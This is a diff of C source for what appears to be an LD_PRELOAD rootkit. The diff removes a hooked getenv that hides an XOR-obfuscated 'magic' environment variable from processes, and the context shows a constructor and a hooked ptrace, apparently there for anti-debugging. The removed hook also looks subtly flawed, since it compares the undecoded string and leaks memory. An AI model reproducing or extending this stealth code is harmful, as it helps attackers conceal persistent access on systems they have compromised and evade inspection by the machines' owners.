@@ -118,23 +118,6 @@ void __attribute ((constructor)) init(void)
 	#endif 
 } 
 
-char *getenv(const char *name)
-{ 
-	HOOK(getenv); 
-	#ifdef DEBUG 
-	printf("[!] getenv hooked\n"); 
-	#endif 
-
-	if (owned()) return old_getenv(name); 
-	char *magicenv = strdup(MAGICENV); xor(magicenv); 
-	if (!strcmp(MAGICENV, name))
-	{ 
-		return NULL; // lol hidden
-	}
-	return old_getenv(name);
-}
-
-
 long int ptrace(enum __ptrace_request request, ...)
 {
 	HOOK(ptrace);
